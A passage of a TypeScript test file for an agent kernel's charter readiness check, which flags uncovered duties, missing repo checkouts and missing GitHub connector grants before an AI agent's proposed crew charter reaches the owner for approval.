// The charter readiness check (phase 8 item 18b, `kernel/src/agents/charter-readiness.ts`):
// before a held `kernel_agent_create` or `kernel_agent_update` reaches the
// owner, the kernel checks every duty against the jobs the charter grants and
// every granted job's prerequisites (a copy of a repo, a connector grant),
// shows the result as a readiness block right after the display's first line,
// tells Wright the open findings and the fix (`agentNote`, appended by the gate
// to the held reason) and names what was still open in the applied sentence.
//
// Unit cases call `charterReadiness` with the shipped composition's catalogue
// (and the `homeDir` seam for the protected folders). Gate cases run the
// session manager (fake spawner/query) with the shipped tools' pre-hold check
// and decide through `decideApproval` with the shipped applier. Workspaces are
// fake checkouts under a temp dir (a `.git/config` with remotes). Never the
// real SDK, a model, git or the network.
import { createHash } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { dirname, join } from "node:path";
import type { HookCallback, HookInput } from "@anthropic-ai/claude-agent-sdk";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  READINESS_COVERED_PREFIX,
  READINESS_DUTY_EXCERPT_MAX,
  READINESS_FLAG_PREFIX,
  READINESS_HEADING,
  READINESS_HEADING_PREFIX,
  READINESS_NOT_CHECKED_PREFIX,
  READINESS_READY_PREFIX,
  charterReadiness,
  dutyExcerpt,
  openFlagsSentence,
  wrightDutyRefusal,
} from "../src/agents/charter-readiness.js";
import type { ReadinessGrant, ReadinessResult } from "../src/agents/charter-readiness.js";
import { AGENT_CREATE_TOOL_NAME, AGENT_UPDATE_TOOL_NAME } from "../src/agents/charter-tools.js";
import { agentSettingsPath, createAgent, getAgent, renderRoleMd, validateCharter } from "../src/agents/index.js";
import type { Charter } from "../src/agents/index.js";
import { decideApproval } from "../src/approvals/index.js";
import { MAX_APPROVAL_DISPLAY } from "../src/approvals/store.js";
import { readWorkspaceRepos, remoteRepos } from "../src/automate/checkout.js";
import { defaultWrightSettingsJson, wrightSettingsPath } from "../src/brain/index.js";
import { TOOL_JOBS, TOOL_JOB_DEFINITIONS, TOOL_JOB_IDS, buildToolCatalogue, jobNeedsWorkspace } from "../src/features/catalogue.js";
import type { ToolJob } from "../src/features/catalogue.js";
import { PHASE1_RESERVED, SHIPPED_CONTRIBUTIONS, mergeContributions } from "../src/features/index.js";
import type { ContributedTool } from "../src/features/index.js";
import { protectedLocationsText } from "../src/protected-paths.js";
import { SessionManager } from "../src/sessions/manager.js";
import type { HeldToolCheck, ToolPolicy } from "../src/sessions/types.js";
import { Store } from "../src/store/index.js";
import { approvalApplierOf, heldToolCheckOf } from "../src/tools/server.js";
import type { KernelToolContext } from "../src/tools/server.js";
import { count, events } from "./loop-helpers.js";
import { fakeSessions, makePluginDir, stubProvider } from "./session-fakes.js";
import type { FakeCall } from "./session-fakes.js";

const K = "mcp__kernel__";
const CREATE = `${K}${AGENT_CREATE_TOOL_NAME}`;
const UPDATE = `${K}${AGENT_UPDATE_TOOL_NAME}`;
const MODEL = "claude-haiku-4-5";
const T0 = "2026-11-10T10:00:00.000Z";
const WRIGHT_POLICY: ToolPolicy = { allowedTools: [CREATE, UPDATE], allowedBashPrefixes: [] };
/** The shipped composition's tools: the pre-hold check, the applier and the catalogue are all built from them, as in the kernel. */
const SHIPPED_TOOLS: readonly ContributedTool[] = mergeContributions(SHIPPED_CONTRIBUTIONS, PHASE1_RESERVED).tools;
const CATALOGUE = buildToolCatalogue(SHIPPED_TOOLS);
/** The held reason with no note: byte-identical to before the readiness check. */
const HELD_REASON =
  "approval_required: held as approval 1; it did not run. The owner decides in Studio's Approvals (approval 1) " +
  "and the decision arrives as a new message. End your turn now; if it is approved, the kernel applies it itself and that message says what it did; do not repeat the call.";
const NOTE_START = "The kernel checked this charter before the owner sees it; open: ";
const PROCEED = " The owner chose to proceed with these still open: ";
const NO_ROOT = process.getuid?.() !== 0;

let tmp: string;
let dataDir: string;
let pluginDir: string;
let home: string;
const clock = { at: new Date(T0) };
const stores: Store[] = [];
const locked: string[] = [];

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "studio-charter-readiness-"));
  dataDir = join(tmp, "data");
  pluginDir = makePluginDir(tmp);
  home = join(tmp, "home");
  mkdirSync(home);
  clock.at = new Date(T0);
});

afterEach(() => {
  for (const s of stores.splice(0)) if (s.isOpen) s.close();
  // A test that failed while a path was unreadable must not leave it so.
  for (const p of locked.splice(0)) if (existsSync(p)) chmodSync(p, 0o700);
  rmSync(tmp, { recursive: true, force: true });
});

// ---- Fixtures ------------------------------------------------------------------

/** The full names of `job`'s catalogue tools, in catalogue order. */
function toolsOf(job: ToolJob): string[] {
  const tools = CATALOGUE.jobs.find((j) => j.id === job)?.tools.map((t) => `${K}${t.name}`) ?? [];
  if (tools.length === 0) throw new Error(`the shipped catalogue has no tool for ${job}`);
  return tools;
}

/** A duty entry. */
const duty = (text: string, ...jobs: ToolJob[]) => ({ text, jobs });

/** A developer charter granting every tool of `jobs` (plus Read), with `duties` and no workspace unless `extra` says. */
function crew(duties: unknown[], jobs: readonly ToolJob[], extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: "dev",
    display_name: "Dev",
    avatar: { shape: "crab", hue: "crew-teal" },
    persona: "A developer for the owner's sandbox repo.",
    duties,
    boundaries: ["Never merge a pull request yourself."],
    model: "claude-sonnet-5",
    permission_mode: "default",
    tool_policy: { allowedTools: ["Read", ...jobs.flatMap(toolsOf)], allowedBashPrefixes: [], never: [] },
    workspaces: [],
    ...extra,
  };
}

/** Approval #19's charter (item 16 Validation 2), reconstructed from the requirement's Problem section. */
function approval19(): Record<string, unknown> {
  return crew(
    [duty("Turn tickets into PRs", "automate_tickets"), duty("Triage PR comments", "triage_pr_comments"), duty("Ask for merges", "ask_for_merge")],
    ["automate_tickets", "read_pr"],
    { connectors: ["github"] },
  );
}

function validated(c: unknown): Charter {
  const r = validateCharter(c, { dataDir });
  if (!r.ok) throw new Error(`not valid: ${r.message}`);
  return r.charter;
}

/** A fake git checkout at `path` whose config names `remotes` as URLs. */
function checkout(path: string, ...remotes: string[]): string {
  mkdirSync(join(path, ".git"), { recursive: true });
  writeFileSync(join(path, ".git", "config"), `[core]\n\tbare = false\n${remotes.map((u, i) => `[remote "r${i}"]\n\turl = ${u}\n`).join("")}`);
  return path;
}

/** `path` made unreadable (restored after the test). */
function lock(path: string): void {
  locked.push(path);
  chmodSync(path, 0o000);
}

function readiness(c: unknown, grant: ReadinessGrant = { kind: "proposed", connectors: [] }, action: "create" | "update" = "create", homeDir = home): ReadinessResult {
  return charterReadiness({ action, charter: validated(c), catalogue: CATALOGUE, grant, dataDir, homeDir });
}

/** The lines of a display that are its readiness block (every one starts with a readiness prefix). */
function readinessLines(display: string): string[] {
  const prefixes = [READINESS_HEADING_PREFIX, READINESS_COVERED_PREFIX, READINESS_READY_PREFIX, READINESS_FLAG_PREFIX, READINESS_NOT_CHECKED_PREFIX];
  return display.split("\n").filter((l) => prefixes.some((p) => l.startsWith(p)));
}

/** The fix sentence's jobs and tools (`add <labels> to tool_policy.allowedTools (<tools>)`), or undefined. */
function proposedFix(note: string | undefined): { labels: string; tools: string[] } | undefined {
  const m = /The fix to propose: add (.+?) to tool_policy\.allowedTools \(([^)]*)\)/.exec(note ?? "");
  return m === null ? undefined : { labels: m[1] as string, tools: (m[2] as string).split(", ") };
}

// ---- The gate harness --------------------------------------------------------------

function writeWrightSettings(): void {
  const file = wrightSettingsPath(dataDir);
  mkdirSync(dirname(file), { recursive: true });
  const settings = JSON.parse(defaultWrightSettingsJson()) as Record<string, unknown>;
  writeFileSync(file, `${JSON.stringify({ ...settings, model: MODEL }, null, 2)}\n`);
}

type Decision = { hookEventName: string; permissionDecision: string; permissionDecisionReason: string };

function gateOf(call: FakeCall): (tool: string, toolInput: unknown) => Promise<Decision> {
  const hook = call.options.hooks?.PreToolUse?.[0]?.hooks[0] as HookCallback;
  return async (tool, toolInput) => {
    const input = { hook_event_name: "PreToolUse", tool_name: tool, tool_input: toolInput, tool_use_id: "toolu_1", session_id: "s", transcript_path: "/dev/null", cwd: tmp } as unknown as HookInput;
    return ((await hook(input, "toolu_1", { signal: new AbortController().signal })) as { hookSpecificOutput: Decision }).hookSpecificOutput;
  };
}

/**
 * A session manager whose gate has the shipped tools' pre-hold check (or
 * `check`), with Wright's session started; `decide` is the owner's `once`
 * with the shipped applier (its catalogue is the composition's).
 */
async function boot(check?: HeldToolCheck) {
  writeWrightSettings();
  const store = new Store({ dataDir });
  stores.push(store);
  const now = (): Date => clock.at;
  const fakes = fakeSessions();
  const toolSessions: KernelToolContext["sessions"] = { stopSession: (id: number) => manager.stopSession(id), getSession: (id: number) => manager.getSession(id) };
  const contextOf = (sessionId: number): KernelToolContext => ({ store, sessions: toolSessions, sessionId, now });
  const manager: SessionManager = new SessionManager(
    { store, authProvider: stubProvider(), loomwrightPath: pluginDir, stopGraceMs: 10, baseEnv: { PATH: "/usr/bin" }, heldToolCheck: check ?? heldToolCheckOf(SHIPPED_TOOLS, contextOf) },
    { ...fakes.deps, homeDir: home, now },
  );
  const handle = await manager.startSession({ agent: "wright", prompt: "Draft a crew member.", model: MODEL, permissionMode: "default", cwd: tmp, policy: WRIGHT_POLICY, closeInputOnResult: false });
  const gate = gateOf(fakes.calls[fakes.calls.length - 1] as FakeCall);
  const applier = approvalApplierOf(SHIPPED_TOOLS);
  const decide = (id: number) => decideApproval(store, { id, decision: "once", by: "owner" }, clock.at, applier);
  const display = (n = 1) => String(events(store, "approval_requested")[n - 1]?.payload.display);
  const applied = (n = 1) => events(store, "approval_decided")[n - 1]?.payload.applied;
  const approvals = () => count(store, "SELECT count(*) FROM approvals");
  /** The owner's own create (`studio agents create`'s path: no readiness check, bare-string duties allowed). */
  const ownerCreate = (c: unknown) => {
    const r = createAgent(store, dataDir, c, { by: "owner" }, clock.at);
    if (!r.ok) throw new Error(`owner create refused: ${r.message}`);
  };
  const settingsFile = (id: string) => agentSettingsPath(dataDir, id);
  const shaOf = (id: string) => createHash("sha256").update(readFileSync(settingsFile(id))).digest("hex");
  /** Hand-edit the member's settings file `connectors` (the owner's own step, in Team). */
  const setConnectors = (id: string, value: unknown) => {
    const file = settingsFile(id);
    const json = JSON.parse(readFileSync(file, "utf8")) as Record<string, unknown>;
    writeFileSync(file, `${JSON.stringify({ ...json, connectors: value }, null, 2)}\n`);
  };
  const update = (id: string, changes: Record<string, unknown>, key = "u1") => gate(UPDATE, { id, changes, expected_sha256: shaOf(id), idempotency_key: key });
  const create = (c: unknown, key = "c1") => gate(CREATE, { charter: c, idempotency_key: key });
  return { store, gate, create, update, decide, display, applied, approvals, ownerCreate, setConnectors };
}

// ---- The format ----------------------------------------------------------------------

describe("the readiness format", () => {
  it("every line prefix is an exported constant, and every line of a block starts with exactly one", () => {
    expect([READINESS_HEADING_PREFIX, READINESS_COVERED_PREFIX, READINESS_READY_PREFIX, READINESS_FLAG_PREFIX, READINESS_NOT_CHECKED_PREFIX]).toEqual([
      "readiness: ",
      "  covered: ",
      "  ready: ",
      "  flagged: ",
      "  not checked: ",
    ]);
    expect(READINESS_HEADING.startsWith(READINESS_HEADING_PREFIX)).toBe(true);
    const r = readiness(approval19());
    expect(r.lines[0]).toBe(READINESS_HEADING);
    for (const line of r.lines.slice(1)) {
      expect([READINESS_COVERED_PREFIX, READINESS_READY_PREFIX, READINESS_FLAG_PREFIX, READINESS_NOT_CHECKED_PREFIX].filter((p) => line.startsWith(p))).toHaveLength(1);
    }
  });

  it("the code jobs are declared once, on the job: TOOL_JOBS is derived from the definitions with the same ids, order and labels", () => {
    expect(Object.keys(TOOL_JOBS)).toEqual(Object.keys(TOOL_JOB_DEFINITIONS));
    for (const [id, def] of Object.entries(TOOL_JOB_DEFINITIONS)) expect(TOOL_JOBS[id as ToolJob]).toBe(def.label);
    expect(TOOL_JOB_IDS.filter((id) => jobNeedsWorkspace(id))).toEqual(["automate_tickets", "triage_pr_comments", "ask_for_merge"]);
  });
});

// ---- AC1, AC4: covered and ready --------------------------------------------------------

describe("AC1 and AC4: everything covered and ready, nothing flagged, no note", () => {
  it("AC1: a member whose duties' jobs are granted, with a GitHub checkout and the owner's GitHub write grant, reads covered and ready; the held update carries no note", async () => {
    const ws = checkout(join(tmp, "work", "sandbox"), "git@github.com:owner/studio-sandbox.git");
    const h = await boot();
    h.ownerCreate(
      // (Not the two crew-run command jobs: their Skill and shell needs are flagged, `agents-charter-needs.test.ts`.)
      crew([duty("Turn tickets into PRs", "automate_tickets"), duty("Read the PRs", "read_pr")], ["automate_tickets", "read_pr"], {
        workspaces: [ws],
      }),
    );
    h.setConnectors("dev", { github: "write" });
    expect((await h.update("dev", { limits: { tokens_per_day: 100000 } })).permissionDecisionReason).toBe(HELD_REASON);
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      "  covered: duty 1 by Hand tickets to /automate: Turn tickets into PRs",
      "  covered: duty 2 by Read a PR: Read the PRs",
      `  ready: copy of a repo for Hand tickets to /automate: works in owner/studio-sandbox at ${ws}`,
      // One line per connector level: a job's read need folds into a write need.
      "  ready: GitHub access for Read a PR: granted",
      "  ready: GitHub write access for Hand tickets to /automate: granted",
    ]);
    // The readiness block is right after the head line.
    expect(h.display().split("\n")[1]).toBe(READINESS_HEADING);
    // Approved with nothing open: the applied sentence is as before.
    h.decide(1);
    expect(h.applied()).toBe("The kernel updated crew member dev on approval 1: limits.tokens_per_day.");
  });

  it("AC1 (unit): nothing open gives no agentNote and no open-flags clause", () => {
    const ws = checkout(join(tmp, "work", "sandbox"), "https://github.com/owner/studio-sandbox.git");
    const r = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [ws] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(r.open).toEqual([]);
    expect(r.agentNote).toBeUndefined();
    expect(openFlagsSentence(r)).toBe("");
    expect(r.lines).toContain(`  ready: copy of a repo for Hand tickets to /automate: works in owner/studio-sandbox at ${ws}`);
  });

  it("AC1: a held create with nothing open has the byte-identical held reason (no note) and an applied sentence with no clause", async () => {
    const h = await boot();
    const c = crew([duty("Read the PRs the owner sends", "read_pr"), duty("Keep reports short")], ["read_pr"], { connectors: ["github"] });
    expect((await h.create(c)).permissionDecisionReason).toBe(HELD_REASON);
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      "  covered: duty 1 by Read a PR: Read the PRs the owner sends",
      "  covered: duty 2 with no tool (it needs no kernel tool): Keep reports short",
      "  ready: GitHub access for Read a PR: proposed in this charter",
    ]);
    h.decide(1);
    expect(h.applied()).toBe("The kernel created crew member dev (Dev) on approval 1.");
  });

  it("AC4: a duty entry with jobs: [] is covered with no tool, whatever the charter grants", () => {
    const r = readiness(crew([duty("Summarise each review in three lines or fewer.")], []));
    expect(r.lines).toEqual([READINESS_HEADING, "  covered: duty 1 with no tool (it needs no kernel tool): Summarise each review in three lines or fewer."]);
    expect(r.items[0]?.status).toBe("covered");
    expect(r.agentNote).toBeUndefined();
  });
});

// ---- AC2: approval #19 ----------------------------------------------------------------------

describe("AC2: approval #19's charter", () => {
  it("flags Triage PR comments and Ask for a merge as not covered, by their plain labels, and the note proposes adding exactly those two jobs' tools", async () => {
    const h = await boot();
    const held = await h.create(approval19());
    expect(held.permissionDecision).toBe("deny");
    expect(held.permissionDecisionReason.startsWith(`${HELD_REASON} ${NOTE_START}`)).toBe(true);
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      "  covered: duty 1 by Hand tickets to /automate: Turn tickets into PRs",
      "  flagged: duty 2 not covered (needs Triage PR comments, which this charter does not grant): Triage PR comments",
      "  flagged: duty 3 not covered (needs Ask for a merge, which this charter does not grant): Ask for merges",
      "  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in (no workspace is listed)",
      "  ready: GitHub access for Read a PR: proposed in this charter",
      "  flagged: GitHub write access for Hand tickets to /automate: only you can grant it (Team, in the member's inspector)",
    ]);
    // The note proposes exactly the two missing jobs, by their catalogue tool names, and no other tool.
    const note = held.permissionDecisionReason.slice(HELD_REASON.length + 1);
    const fix = proposedFix(note);
    expect(fix).toEqual({ labels: "Triage PR comments and Ask for a merge", tools: [...toolsOf("triage_pr_comments"), ...toolsOf("ask_for_merge")] });
    expect(note.match(/mcp__kernel__\w+/g)).toEqual([...toolsOf("triage_pr_comments"), ...toolsOf("ask_for_merge")]);
    // The note rides on the session's reason only: the approval stores no note.
    expect(JSON.stringify(events(h.store, "approval_requested")[0]?.payload)).not.toContain(NOTE_START);
  });

  it("a missing job with tools beside one with none: the fix names only the job with tools; the other is named apart, with no change", () => {
    // A catalogue with no tool for comment_on_issues (as the playbook fit check's test strips one).
    const partial = buildToolCatalogue(SHIPPED_TOOLS.filter((t) => t.job !== "comment_on_issues"));
    const c = crew([duty("Ask for merges", "ask_for_merge"), duty("Comment on the issues", "comment_on_issues")], []);
    const r = charterReadiness({ action: "create", charter: validated(c), catalogue: partial, grant: { kind: "proposed", connectors: [] }, dataDir, homeDir: home });
    expect(r.lines).toEqual([
      READINESS_HEADING,
      "  flagged: duty 1 not covered (needs Ask for a merge, which this charter does not grant): Ask for merges",
      `  flagged: duty 2 not covered (needs ${TOOL_JOBS.comment_on_issues}, which this charter does not grant): Comment on the issues`,
    ]);
    expect(proposedFix(r.agentNote)).toEqual({ labels: "Ask for a merge", tools: toolsOf("ask_for_merge") });
    expect(r.agentNote?.match(/mcp__kernel__\w+/g)).toEqual(toolsOf("ask_for_merge"));
    expect(r.agentNote).toContain(
      `This charter needs ${TOOL_JOBS.comment_on_issues}; the kernel has no tool for it, so no charter change can give it to this member: propose no tool change for it.`,
    );
    // Job labels and the kernel's words only: never a duty's text.
    expect(r.agentNote).not.toContain("Ask for merges");
    expect(r.agentNote).not.toContain("Comment on the issues");
  });

  it("only missing jobs with no tool: no fix sentence, one sentence naming them all", () => {
    const partial = buildToolCatalogue(SHIPPED_TOOLS.filter((t) => t.job !== "comment_on_issues" && t.job !== "ask_for_merge"));
    const c = crew([duty("Ask for merges", "ask_for_merge"), duty("Comment on the issues", "comment_on_issues")], []);
    const r = charterReadiness({ action: "update", charter: validated(c), catalogue: partial, grant: { kind: "stored", raw: undefined }, dataDir, homeDir: home });
    expect(proposedFix(r.agentNote)).toBeUndefined();
    expect(r.agentNote).not.toMatch(/mcp__kernel__/);
    expect(r.agentNote).toContain(
      `This charter needs ${TOOL_JOBS.ask_for_merge} and ${TOOL_JOBS.comment_on_issues}; the kernel has no tool for them, so no charter change can give them to this member: propose no tool change for them.`,
    );
  });
});

// ---- AC3: a code job without a copy of a repo ------------------------------------------------

describe("AC3: a code job with no copy of a repo to work in", () => {
  for (const job of ["automate_tickets", "triage_pr_comments", "ask_for_merge"] as const) {
    it(`${job}: no workspace is flagged "has no copy of a repo to work in", and the note asks the owner where their copy is`, () => {
      const r = readiness(crew([duty("Do the code job", job)], [job]));
      expect(r.lines).toContain(`  flagged: copy of a repo for ${TOOL_JOBS[job]}: it has no copy of a repo to work in (no workspace is listed)`);
      expect(r.agentNote).toContain("Ask the owner where their copy of the repo is");
    });
  }

  it("a workspace that is not a checkout, or has no GitHub remote, is no copy of a repo either; each says why", () => {
    const plainDir = join(tmp, "work", "notes");
    mkdirSync(plainDir, { recursive: true });
    const gitlab = checkout(join(tmp, "work", "gl"), "git@gitlab.com:owner/repo.git");
    const missing = join(tmp, "work", "gone");
    const r = readiness(crew([duty("Ask for merges", "ask_for_merge")], ["ask_for_merge"], { workspaces: [plainDir, gitlab, missing] }));
    expect(r.lines).toContain(
      `  flagged: copy of a repo for Ask for a merge: it has no copy of a repo to work in: ${plainDir}: it is not a git checkout; ${gitlab} has no GitHub remote; ${missing}: the folder does not exist`,
    );
    expect(r.agentNote).toContain("Ask the owner where their copy of the repo is");
  });

  it("a job that does not work on code has no workspace line", () => {
    const r = readiness(crew([duty("Read PRs", "read_pr")], ["read_pr"], { connectors: ["github"] }));
    expect(r.items.filter((i) => i.subject === "workspace")).toEqual([]);
  });

  it("several checkouts: the ready line names every repo found and where", () => {
    const a = checkout(join(tmp, "work", "a"), "https://github.com/owner/a.git", "git@github.com:upstream/a.git");
    const b = checkout(join(tmp, "work", "b"), "ssh://git@github.com/owner/b");
    const r = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [a, b] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(r.lines).toContain(`  ready: copy of a repo for Hand tickets to /automate: works in owner/a, upstream/a at ${a}; owner/b at ${b}`);
  });
});

// ---- AC5: a protected workspace -----------------------------------------------------------

describe("AC5: a workspace in a macOS-protected folder", () => {
  it("a create or update naming one is refused before the hold, in plain words saying why the folder can't be used", async () => {
    const h = await boot();
    // The hold checks the real home's protected folders (as the settings reader does); nothing is read or written there.
    const ws = join(homedir(), "Documents", "studio-sandbox");
    const why = `${ws} is inside a macOS-protected folder (${protectedLocationsText()}), so it can't be used: macOS blocks the kernel, which runs in the background, from reading anything there (D31); use a copy of the repo outside those folders`;
    const created = await h.create(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [ws] }));
    expect(created.permissionDecisionReason).toBe(`kernel_agent_create: invalid_input: workspaces.0: ${why} (nothing was held for the owner)`);
    h.ownerCreate(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"]));
    const updated = await h.update("dev", { workspaces: [ws] });
    expect(updated.permissionDecisionReason).toBe(`kernel_agent_update: invalid_input: the result would not be a valid charter: workspaces.0: ${why} (nothing was held for the owner)`);
    expect(h.approvals()).toBe(0);
  });

  it("the readiness check (homeDir seam) marks a protected checkout can't be used and why, never ready", () => {
    const ws = checkout(join(home, "Documents", "studio-sandbox"), "git@github.com:owner/studio-sandbox.git");
    const r = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [ws] }), { kind: "stored", raw: { github: "write" } }, "update");
    const line = r.items.find((i) => i.subject === "workspace")?.line;
    expect(line).toBe(
      `  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in: ${ws} can't be used: it is inside a macOS-protected folder (${protectedLocationsText()}), and macOS blocks the kernel, which runs in the background, from reading anything there (D31)`,
    );
    // The same checkout outside the protected folders is ready.
    const outside = checkout(join(home, "code", "studio-sandbox"), "git@github.com:owner/studio-sandbox.git");
    const ok = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [outside] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(ok.items.find((i) => i.subject === "workspace")?.status).toBe("ready");
  });

  it("a workspace that is the data dir or holds it can't be used (validateCharter refuses it first; the check never calls it ready)", () => {
    checkout(dataDir, "git@github.com:owner/data.git");
    const charter: Charter = { ...validated(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"])), workspaces: [tmp, dataDir] };
    const r = charterReadiness({ action: "update", charter, catalogue: CATALOGUE, grant: { kind: "stored", raw: { github: "write" } }, dataDir, homeDir: home });
    expect(r.items.find((i) => i.subject === "workspace")?.line).toBe(
      `  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in: ${tmp} can't be used: it is the kernel's data dir, inside it or holds it; ${dataDir} can't be used: it is the kernel's data dir, inside it or holds it`,
    );
  });
});

// ---- AC6: a connector the member lacks ---------------------------------------------------

describe("AC6: a connector the member lacks is the owner's step, never in the note's fix", () => {
  it("create: a job needing GitHub with no connector proposed names GitHub access as the owner's step; the note never proposes adding it", () => {
    const r = readiness(crew([duty("Read PRs", "read_pr")], ["read_pr"]), { kind: "proposed", connectors: [] });
    expect(r.lines).toContain("  flagged: GitHub access for Read a PR: only you can grant it (Team, in the member's inspector)");
    expect(r.agentNote).toContain("Connector access is the owner's own step, in Team");
    expect(proposedFix(r.agentNote)).toBeUndefined();
    expect(r.agentNote).not.toMatch(/connectors|\bgithub\b/);
  });

  it("create: a write level is never met by a proposal (only the owner sets it, in Team)", () => {
    const r = readiness(crew([duty("Read PRs", "read_pr"), duty("Triage comments", "triage_pr_comments")], ["read_pr", "triage_pr_comments"]), { kind: "proposed", connectors: ["github"] });
    expect(r.lines).toContain("  ready: GitHub access for Read a PR: proposed in this charter");
    expect(r.lines).toContain("  flagged: GitHub write access for Triage PR comments: only you can grant it (Team, in the member's inspector)");
    expect(proposedFix(r.agentNote)).toBeUndefined();
  });

  it("update: the member's stored grant is read at the needed level", async () => {
    const h = await boot();
    const ws = checkout(join(tmp, "work", "sandbox"), "git@github.com:owner/studio-sandbox.git");
    h.ownerCreate(crew([duty("Read PRs", "read_pr"), duty("Triage comments", "triage_pr_comments")], ["read_pr", "triage_pr_comments"], { workspaces: [ws], connectors: ["github"] }));
    const held = await h.update("dev", { limits: { tokens_per_day: 100000 } });
    expect(readinessLines(h.display())).toContain("  ready: GitHub access for Read a PR: granted");
    expect(readinessLines(h.display())).toContain("  flagged: GitHub write access for Triage PR comments: only you can grant it (Team, in the member's inspector)");
    const note = held.permissionDecisionReason.slice(HELD_REASON.length + 1);
    expect(note).toContain("Connector access is the owner's own step");
    expect(proposedFix(note)).toBeUndefined();
    // With no grant at all, every level is the owner's step.
    const none = readiness(crew([duty("Read PRs", "read_pr"), duty("Triage comments", "triage_pr_comments")], ["read_pr", "triage_pr_comments"], { workspaces: [ws] }), { kind: "stored", raw: undefined }, "update");
    expect(none.lines).toContain("  flagged: GitHub access for Read a PR: only you can grant it (Team, in the member's inspector)");
    expect(none.lines).toContain("  flagged: GitHub write access for Triage PR comments: only you can grant it (Team, in the member's inspector)");
  });
});

// ---- AC7: an update that removes a duty's job ---------------------------------------------

describe("AC7: an update whose tool_policy removes every tool of a job a stored duty names", () => {
  it("flags that duty against the merged tools, not the member's old ones", async () => {
    const h = await boot();
    h.ownerCreate(crew([duty("Read the PRs the owner sends", "read_pr")], ["read_pr"], { connectors: ["github"] }));
    const held = await h.update("dev", { tool_policy: { allowedTools: ["Read"], allowedBashPrefixes: [] } });
    expect(readinessLines(h.display())).toEqual([READINESS_HEADING, "  flagged: duty 1 not covered (needs Read a PR, which this charter does not grant): Read the PRs the owner sends"]);
    const note = held.permissionDecisionReason.slice(HELD_REASON.length + 1);
    expect(proposedFix(note)?.tools).toEqual(toolsOf("read_pr"));
    expect(note).toContain("propose a kernel_agent_update with a new idempotency_key");
  });

  it("removing only some of a job's tools also leaves the duty uncovered", () => {
    const tools = toolsOf("read_pr");
    const c = crew([duty("Read PRs", "read_pr")], [], { tool_policy: { allowedTools: tools.slice(1), allowedBashPrefixes: [], never: [] }, connectors: ["github"] });
    const r = readiness(c);
    expect(r.items[0]?.status).toBe("flagged");
    expect(proposedFix(r.agentNote)?.tools).toEqual(tools.slice(0, 1));
  });
});

// ---- AC8: the applied sentence --------------------------------------------------------------

describe("AC8: an approval with flags still open names them in the applied sentence", () => {
  it("create: the owner's once on approval #19's charter records the open flags as the owner's choice to proceed", async () => {
    const h = await boot();
    await h.create(approval19());
    h.decide(1);
    expect(getAgent(h.store, "dev")).toBeDefined();
    expect(h.applied()).toBe(
      "The kernel created crew member dev (Dev) on approval 1." +
        `${PROCEED}duty 2 is not covered (needs Triage PR comments); duty 3 is not covered (needs Ask for a merge); ` +
        "no copy of a repo to work in (for Hand tickets to /automate); GitHub write access for Hand tickets to /automate: the owner's step in Team.",
    );
  });

  it("update: the applied sentence names the open flags of the merged result", async () => {
    const h = await boot();
    h.ownerCreate(crew([duty("Read the PRs the owner sends", "read_pr")], ["read_pr"], { connectors: ["github"] }));
    await h.update("dev", { tool_policy: { allowedTools: ["Read"], allowedBashPrefixes: [] } });
    h.decide(1);
    expect(h.applied()).toBe(`The kernel updated crew member dev on approval 1: tool_policy.${PROCEED}duty 1 is not covered (needs Read a PR).`);
  });
});

// ---- AC9: an unknown job ----------------------------------------------------------------------

describe("AC9: a duty naming a job outside TOOL_JOBS", () => {
  it("is refused invalid_input naming the job, and nothing is held (Wright's create)", async () => {
    const h = await boot();
    const d = await h.create(crew([duty("Deploy to production", "deploy_prod" as ToolJob)], []));
    expect(d.permissionDecision).toBe("deny");
    expect(d.permissionDecisionReason).toBe(
      `kernel_agent_create: invalid_input: duties.0.jobs.0: "deploy_prod" is not a job in the kernel's catalogue (the jobs are ${Object.keys(TOOL_JOBS).join(", ")}) (nothing was held for the owner)`,
    );
    expect(h.approvals()).toBe(0);
  });

  it("is refused on every path: the owner's create (validateCharter) too", () => {
    const r = validateCharter(crew([duty("Fine"), duty("Deploy", "read_pr", "deploy_prod" as ToolJob)], []), { dataDir });
    expect(r).toMatchObject({ ok: false, error: "charter_invalid", field: "duties.1.jobs.1" });
    expect(r.ok ? "" : r.message).toContain('"deploy_prod" is not a job in the kernel\'s catalogue');
  });

  it("an update of a member whose stored duty names an unknown job is refused, naming it", async () => {
    const h = await boot();
    h.ownerCreate(crew([duty("Read PRs", "read_pr")], ["read_pr"]));
    const stored = JSON.parse(String(getAgent(h.store, "dev")?.charter_json)) as Record<string, unknown>;
    h.store.prepare("UPDATE agents SET charter_json = ? WHERE id = 'dev'").run(JSON.stringify({ ...stored, duties: [duty("Deploy", "deploy_prod" as ToolJob)] }));
    const d = await h.update("dev", { limits: { tokens_per_day: 100000 } });
    expect(d.permissionDecisionReason).toMatch(/^kernel_agent_update: invalid_input: the result would not be a valid charter: duties\.0\.jobs\.0: "deploy_prod" is not a job in the kernel's catalogue/);
    expect(h.approvals()).toBe(0);
  });

  it("a duty entry with a misspelt key or a repeated job is refused too; a bare string stays valid", () => {
    expect(validateCharter(crew([{ text: "x", jobs: [], job: "read_pr" }], []), { dataDir })).toMatchObject({ ok: false, field: "duties.0.job" });
    expect(validateCharter(crew([duty("x", "read_pr", "read_pr")], []), { dataDir })).toMatchObject({ ok: false, field: "duties.0.jobs" });
